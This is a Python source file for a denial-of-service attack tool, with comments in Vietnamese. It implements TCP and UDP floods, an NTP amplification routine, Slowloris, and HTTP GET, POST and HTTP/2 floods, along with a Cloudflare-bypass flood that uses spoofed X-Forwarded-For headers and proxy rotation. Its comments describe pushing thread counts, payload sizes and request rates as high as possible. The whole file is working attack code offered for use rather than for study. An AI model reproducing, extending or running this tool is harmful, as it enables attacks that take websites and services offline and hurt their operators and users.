import asyncio
import socket
from time import time
import random
from urllib.parse import urlparse
from cloudscraper import create_scraper
import psutil
import ssl
import aiohttp
from contextlib import suppress
from utils import randbytes, humanbytes

class AttackBase:
    def __init__(self, target, method, proxies=None, threads=1000, duration=60, referers=None, user_agents=None):
        self.target = target
        self.method = method.upper()
        self.proxies = list(proxies) if proxies else []
        self.duration = duration
        self.threads = min(threads, psutil.cpu_count() * 1000)  # Tăng threads tối đa
        self.bytes_sent = 0
        self.requests_sent = 0
        self.running = False
        self.start_time = None
        self.referers = referers or ["https://www.google.com/"]
        self.user_agents = user_agents or ["Mozilla/5.0"]

    def get_socket(self, ssl_enabled=False):
        proxy = random.choice(self.proxies) if self.proxies else None
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.settimeout(0.2)  # Giảm timeout tối đa để tăng tốc
        if ssl_enabled and not proxy:
            sock = ssl.wrap_socket(sock)
        return sock, proxy

class Layer4Attack(AttackBase):
    async def run(self):
        self.running = True
        self.start_time = time()
        end_time = self.start_time + self.duration
        if isinstance(self.target, str):
            host, port = self.target.split(":")
            self.target = (socket.gethostbyname(host), int(port))
        methods = {
            "TCP": self.tcp_flood,
            "UDP": self.udp_flood,
            "NTP": self.ntp_amplification,
            "SLOWLORIS": self.slowloris
        }
        if self.method in methods:
            tasks = [asyncio.create_task(methods[self.method]()) for _ in range(self.threads)]
            await asyncio.wait(tasks)
        else:
            logger.error(f"Method {self.method} not supported.")
        self.running = False

    async def tcp_flood(self):
        with suppress(Exception):
            sock, proxy = self.get_socket()
            target = (proxy.ip, proxy.port) if proxy else self.target
            sock.connect(target)
            payload = randbytes(16384)  # Payload siêu lớn
            while self.running:
                sent = sock.send(payload)
                self.bytes_sent += sent
                self.requests_sent += 1
            sock.close()

    async def udp_flood(self):
        with suppress(Exception):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = randbytes(16384)
            while self.running:
                sent = sock.sendto(payload, self.target)
                self.bytes_sent += sent
                self.requests_sent += 1
            sock.close()

    async def ntp_amplification(self):
        payload = b'\x17\x00\x03\x2a' + randbytes(32)  # Payload amplification lớn hơn
        with suppress(Exception):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while self.running:
                sent = sock.sendto(payload, self.target)
                self.bytes_sent += sent
                self.requests_sent += 1
            sock.close()

    async def slowloris(self):
        sockets = []
        with suppress(Exception):
            for _ in range(min(self.threads, 2000)):  # Tăng số kết nối tối đa
                sock, proxy = self.get_socket()
                target = (proxy.ip, proxy.port) if proxy else self.target
                sock.connect(target)
                sock.send(f"GET / HTTP/1.1\r\nHost: {self.target[0]}\r\n".encode())
                sockets.append(sock)
            while self.running:
                for sock in sockets[:]:
                    try:
                        sock.send(b"X-a: " + randbytes(32) + b"\r\n")  # Payload lớn hơn
                        self.bytes_sent += 34
                        self.requests_sent += 1
                    except:
                        sockets.remove(sock)
                await asyncio.sleep(0.1)  # Giảm delay tối đa

class Layer7Attack(AttackBase):
    async def run(self):
        self.running = True
        self.start_time = time()
        end_time = self.start_time + self.duration
        self.parsed = urlparse(self.target)
        self.host = self.parsed.hostname
        self.port = self.parsed.port or (443 if self.parsed.scheme == "https" else 80)
        methods = {
            "HTTP2": self.http2_flood,
            "GET": self.http_get,
            "POST": self.http_post,
            "CFB": self.cloudflare_bypass,
            "FLOOD": self.flood_attack
        }
        if self.method in methods:
            tasks = [asyncio.create_task(methods[self.method]()) for _ in range(self.threads)]
            await asyncio.wait(tasks)
        else:
            logger.error(f"Method {self.method} not supported.")
        self.running = False

    async def http_get(self):
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "Referer": random.choice(self.referers),
            "X-Forwarded-For": '.'.join(str(random.randint(1, 255)) for _ in range(4)),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "X-Custom": randbytes(128).hex()  # Headers lớn hơn
        }
        with suppress(Exception):
            sock, proxy = self.get_socket(self.parsed.scheme == "https")
            target = (proxy.ip, proxy.port) if proxy else (self.host, self.port)
            sock.connect(target)
            payload = f"GET {self.parsed.path or '/'} HTTP/1.1\r\nHost: {self.host}\r\n" + \
                      "\r\n".join(f"{k}: {v}" for k, v in headers.items()) + "\r\n\r\n"
            while self.running:
                sent = sock.send(payload.encode())
                self.bytes_sent += sent
                self.requests_sent += 1
            sock.close()

    async def http_post(self):
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "Referer": random.choice(self.referers),
            "X-Forwarded-For": '.'.join(str(random.randint(1, 255)) for _ in range(4)),
            "Content-Type": "application/octet-stream",
            "X-Custom": randbytes(128).hex()
        }
        with suppress(Exception):
            sock, proxy = self.get_socket(self.parsed.scheme == "https")
            target = (proxy.ip, proxy.port) if proxy else (self.host, self.port)
            sock.connect(target)
            payload = f"POST {self.parsed.path or '/'} HTTP/1.1\r\nHost: {self.host}\r\n" + \
                      "\r\n".join(f"{k}: {v}" for k, v in headers.items()) + \
                      f"\r\nContent-Length: 32768\r\n\r\n{randbytes(32768).decode('latin1')}"  # Payload siêu lớn
            while self.running:
                sent = sock.send(payload.encode())
                self.bytes_sent += sent
                self.requests_sent += 1
            sock.close()

    async def http2_flood(self):
        headers = {
            "User-Agent": random.choice(self.user_agents),
            ":method": "GET",
            ":path": self.parsed.path or "/",
            ":authority": self.host,
            "Referer": random.choice(self.referers),
            "Accept-Encoding": "gzip, deflate, br",
            "X-Custom": randbytes(256).hex()  # Headers lớn hơn nữa
        }
        with suppress(Exception):
            proxy = random.choice(self.proxies) if self.proxies else None
            proxy_url = f"http://{proxy}" if proxy else None
            async with aiohttp.ClientSession() as session:
                while self.running:
                    async with session.get(self.target, headers=headers, proxy=proxy_url) as resp:
                        data = await resp.read()
                        self.bytes_sent += len(data)
                        self.requests_sent += 1
                    await asyncio.sleep(0.005)  # Giảm delay tối đa để tăng PPS

    async def cloudflare_bypass(self):
        with suppress(Exception):
            scraper = create_scraper()
            proxy = random.choice(self.proxies) if self.proxies else None
            proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
            headers = {
                "User-Agent": random.choice(self.user_agents),
                "Referer": random.choice(self.referers),
                "X-Custom": randbytes(128).hex()
            }
            while self.running:
                resp = scraper.get(self.target, headers=headers, proxies=proxy_dict)
                self.bytes_sent += len(resp.request.body or b"") + len(resp.content)
                self.requests_sent += 1
                await asyncio.sleep(0.01)  # Giảm delay

    async def flood_attack(self):
        # Phương thức nâng cấp: HTTP Flood với Multiplexing và Dynamic Payload
        with suppress(Exception):
            async with aiohttp.ClientSession() as session:
                while self.running:
                    headers = {
                        "User-Agent": random.choice(self.user_agents),
                        "Referer": random.choice(self.referers),
                        "X-Forwarded-For": '.'.join(str(random.randint(1, 255)) for _ in range(4)),
                        "Accept": random.choice(["text/html", "*/*", "application/json"]),
                        "Cache-Control": "no-cache",
                        "Connection": "keep-alive",
                        "X-Request-ID": ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=64)),
                        "X-Custom-Header": randbytes(512).hex()  # Headers siêu lớn
                    }
                    proxy = random.choice(self.proxies) if self.proxies else None
                    proxy_url = f"http://{proxy}" if proxy else None
                    # Multiplexing: Gửi nhiều yêu cầu GET/POST song song
                    tasks = [
                        session.get(self.target, headers=headers, proxy=proxy_url),
                        session.post(self.target, headers=headers, data=randbytes(65536), proxy=proxy_url)  # Payload cực lớn
                    ]
                    responses = await asyncio.gather(*tasks, return_exceptions=True)
                    for resp in responses:
                        if not isinstance(resp, Exception):
                            data = await resp.read()
                            self.bytes_sent += len(data)
                            self.requests_sent += 1
                    await asyncio.sleep(0.001)  # Giảm delay tối đa để tăng PPS